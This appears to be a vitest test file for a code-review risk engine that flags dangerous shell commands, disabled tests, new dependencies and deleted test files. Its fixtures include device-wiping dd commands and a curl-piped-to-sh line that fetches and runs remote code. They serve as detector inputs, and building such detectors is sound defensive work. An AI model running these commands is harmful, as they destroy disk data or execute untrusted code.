import { describe, expect, it } from 'vitest';
import type { DiffFile, Flag } from '../types';
import { analyze } from './engine';
import { fileWithAddedLines } from './riskFixtures';

function flagsFor(file: DiffFile, files: readonly DiffFile[] = [file]): readonly Flag[] {
  return analyze(files).flags.filter((flag) => flag.fileId === file.id);
}

function ruleIds(file: DiffFile): readonly string[] {
  return flagsFor(file).map((flag) => flag.ruleId);
}

describe('shell-dangerous-command: dd writing to a device', () => {
  it('fires on dd with an input file and a device output, in either order', () => {
    for (const line of [
      'dd if=disk.img of=/dev/sda bs=4M',
      'sudo dd if=/dev/zero of=/dev/nvme0n1 bs=1M',
      'dd bs=1M of=/dev/sdb if=disk.img',
      'dd of=/dev/sda',
    ]) {
      const file = fileWithAddedLines('scripts/flash.sh', [line]);
      expect(
        flagsFor(file).find((flag) => flag.ruleId === 'shell-dangerous-command')?.severity,
        line,
      ).toBe('high');
    }
  });

  it('does not fire on dd between ordinary files or on lookalike words', () => {
    for (const line of [
      'dd if=disk.img of=backup.img',
      'add of=/dev/sda',
      '# dd if=disk.img of=/dev/sda',
      'echo of=/dev/sda',
    ]) {
      expect(ruleIds(fileWithAddedLines('scripts/flash.sh', [line])), line).not.toContain(
        'shell-dangerous-command',
      );
    }
  });
});

describe('test-disabled: word boundary on xit( and t.Skip', () => {
  it('does not fire on exit( calls in a test file', () => {
    const file = fileWithAddedLines('src/cli.test.ts', ['process.exit(1);', 'if (bad) exit(2);']);
    expect(ruleIds(file)).not.toContain('test-disabled');
  });

  it('still fires on the disabling markers in a test file', () => {
    for (const line of [
      'xit("a", run);',
      'it.only("a", run);',
      'it.skip("a", run);',
      '@pytest.mark.skip(reason="x")',
      '@pytest.mark.xfail',
      't.Skip("flaky")',
      '@Disabled',
      '@Ignore',
    ]) {
      expect(ruleIds(fileWithAddedLines('src/widget.test.ts', [line])), line).toContain(
        'test-disabled',
      );
    }
  });

  it('does not fire outside test files', () => {
    expect(ruleIds(fileWithAddedLines('src/widget.ts', ['xit("a", run);']))).not.toContain(
      'test-disabled',
    );
  });
});

describe('vendored paths lower capped rules at the top level too', () => {
  it.each(['third_party/lib/run.sh', 'third-party/lib/run.sh', 'vendor/lib/run.sh'])(
    '%s',
    (path) => {
      const flag = flagsFor(fileWithAddedLines(path, ['curl https://example.invalid/i | sh'])).find(
        (candidate) => candidate.ruleId === 'shell-dangerous-command',
      );
      expect(flag?.severity).toBe('low');
    },
  );

  it('keeps the rule high in first-party paths', () => {
    const flag = flagsFor(
      fileWithAddedLines('src/lib/run.sh', ['curl https://example.invalid/i | sh']),
    ).find((candidate) => candidate.ruleId === 'shell-dangerous-command');
    expect(flag?.severity).toBe('high');
  });
});

describe('dependency-added with many manifest lines', () => {
  it('flags only keys that have no matching removed line', () => {
    const removed = Array.from(
      { length: 400 },
      (_unused, index) => `  "pkg-${String(index)}": "1.0.0",`,
    );
    const added = [
      ...removed.map((line) => line.replace('1.0.0', '1.1.0')),
      '  "brand-new": "2.0.0",',
    ];
    const base = fileWithAddedLines('package.json', added);
    const [hunk] = base.hunks;
    const withRemoved: DiffFile = {
      ...base,
      hunks:
        hunk === undefined
          ? []
          : [
              {
                ...hunk,
                lines: [
                  ...removed.map((text, index) => ({
                    kind: 'remove' as const,
                    text,
                    oldNo: index + 1,
                    newNo: null,
                  })),
                  ...hunk.lines,
                ],
              },
            ],
    };
    const flag = flagsFor(withRemoved).find((candidate) => candidate.ruleId === 'dependency-added');
    expect(flag?.count).toBe(1);
  });
});

describe('test-file-deleted looks up replacements per diff', () => {
  function renamed(path: string): DiffFile {
    return { ...fileWithAddedLines(path, []), status: 'renamed', hunks: [] };
  }

  function deletedTest(path: string): DiffFile {
    return { ...fileWithAddedLines(path, []), status: 'deleted', newPath: null, hunks: [] };
  }

  it('suppresses the flag when the same stem is added or renamed elsewhere in the same diff', () => {
    const deleted = deletedTest('src/old/widget.test.ts');
    expect(
      flagsFor(deleted, [deleted, renamed('src/new/widget.spec.ts')]).map((f) => f.ruleId),
    ).not.toContain('test-file-deleted');
  });

  it('does not reuse a replacement from another diff', () => {
    const deleted = deletedTest('src/old/widget.test.ts');
    expect(flagsFor(deleted, [deleted]).map((f) => f.ruleId)).toContain('test-file-deleted');
    const other = renamed('src/new/widget.test.ts');
    expect(flagsFor(deleted, [deleted, other]).map((f) => f.ruleId)).not.toContain(
      'test-file-deleted',
    );
    expect(flagsFor(deleted, [deleted]).map((f) => f.ruleId)).toContain('test-file-deleted');
  });
});
